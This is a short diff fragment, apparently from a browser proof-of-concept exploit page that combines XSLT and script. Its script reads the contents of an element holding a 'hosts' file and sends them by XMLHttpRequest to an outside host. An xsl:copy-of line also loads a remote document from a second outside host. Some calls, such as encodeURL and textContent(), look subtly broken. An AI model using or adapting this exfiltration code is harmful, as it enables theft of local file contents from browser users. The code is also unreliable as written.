@@ -14,6 +14,8 @@
           xhr.open("GET", "https://sa.eyes.sh/?exp="+encodeURL(document.getElementById("hosts").textContent());
           xhr.send();
           alert(document.getElementById("hosts").textContent());
+        }
+        </script>
       <xmp><xsl:copy-of  select="document('https://sumsec.me/resources/chrome/r.xxx')"/></xmp>
       
     </body>
